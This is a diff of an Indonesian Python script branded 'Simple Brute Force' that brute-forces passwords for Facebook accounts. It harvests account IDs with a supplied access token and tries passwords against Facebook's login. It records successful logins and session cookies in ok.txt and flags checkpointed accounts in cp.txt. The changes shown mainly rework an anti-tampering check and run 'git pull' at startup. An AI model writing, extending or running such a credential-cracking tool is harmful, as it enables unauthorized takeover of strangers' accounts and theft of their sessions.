@@ -7,27 +7,22 @@ from concurrent.futures import ThreadPoolExecutor as ThreadPool
 ok = []
 cp = []
 ttl = []
-__dapunta__ = []
-__cici__ = []
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 def logo():
     print('\n   _______  ____    ___ \n  / __/ _ )/ __/___|_  | ┌────────────────────────┐\n _\ \/ _  / _//___/ __/  │  • Coded By Dapunta •  │\n/___/____/_/     /____/  │ Github.com/Dapunta/sbf │\n  Simple Brute Force     └────────────────────────┘\n')
 def login():
     os.system('rm -rf token.txt');os.system('clear');logo()
-    cek_recode()
     token = input('[•] Masukkan Token :\n\n')
     try:x = requests.get("https://graph.facebook.com/me?access_token=" + token);y = json.loads(x.text);n = y['name'];v = open("token.txt", "w");v.write(token);v.close();exit(bot_follow_sbf.main())
     except (KeyError,IOError):print('\n[!] Token Invalid');os.system('rm -rf token.txt');login()
     except requests.exceptions.ConnectionError:print('\n[!] Koneksi Bermasalah');os.system('rm -rf token.txt');login()
-def menu():
+def menu(__cici__):
     os.system('clear');logo()
-    cek_recode()
     try:token = open("token.txt","r").read();x = requests.get("https://graph.facebook.com/me?access_token=" + token);y = json.loads(x.text);n = y['name'];i = y['id']
     except (KeyError,IOError):print('\n[!] Token Invalid');os.system('rm -rf token.txt');login()
     except requests.exceptions.ConnectionError:print('\n[!] Koneksi Bermasalah');os.system('rm -rf token.txt');login()
-    print('[•] Nama : %s'%(n));print('[•] ID : %s'%(i));crack_publik()
-def crack_publik():
-    cek_recode()
+    print('[•] Nama : %s'%(n));print('[•] ID : %s'%(i));crack_publik(__cici__)
+def crack_publik(__cici__):
     try:token = open("token.txt","r").read()
     except (KeyError,IOError):print('\n[!] Token Invalid');os.system('rm -rf token.txt');login()
     except requests.exceptions.ConnectionError:print('\n[!] Koneksi Bermasalah');os.system('rm -rf token.txt');login()
@@ -60,11 +55,8 @@ def password(_cici_):
     return _dapunta_
 def cek_recode():
     try :
-        if '__dapunta__' in __dapunta__:pass
-        else : exit('\nMampus Error Mau Lu Recode Kan?')
-    except : exit('\nMampus Error Mau Lu Recode Kan?')
-    try :
-        if '__cici__' in __cici__:pass
+        __dapunta__ = open('pass.txt','r').read()
+        if '__dapunta__cici__forever__' in __dapunta__ : return menu(__dapunta__)
         else : exit('\nMampus Error Mau Lu Recode Kan?')
     except : exit('\nMampus Error Mau Lu Recode Kan?')
 def tambah_pass():
@@ -84,7 +76,7 @@ def logger(em,pas,hosts):
     elif "checkpoint" in list(r.cookies.get_dict().keys()):return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
     else:return {"status":"error","email":em,"pass":pas}
 def append():
-    __dapunta__.append('__dapunta__');__cici__.append('__cici__')
+    __dapunta__=open('__dapunta__.txt','w');__dapunta__.write('__dapunta__cici__forever__');__dapunta__.close
 def koki(cookies):
     result=[]
     for i in enumerate(cookies.keys()):
@@ -123,4 +115,4 @@ class crack:
             self.mbasic(fl)
 def started():
     print('\n[•] Crack Sedang Berjalan...');print('[•] Akun [OK] Disimpan Ke ok.txt');print('[•] Akun [CP] Disimpan Ke cp.txt\n')
-if __name__=='__main__':os.system('git pull');append();menu()
+if __name__=='__main__':os.system('git pull');append();cek_recode()
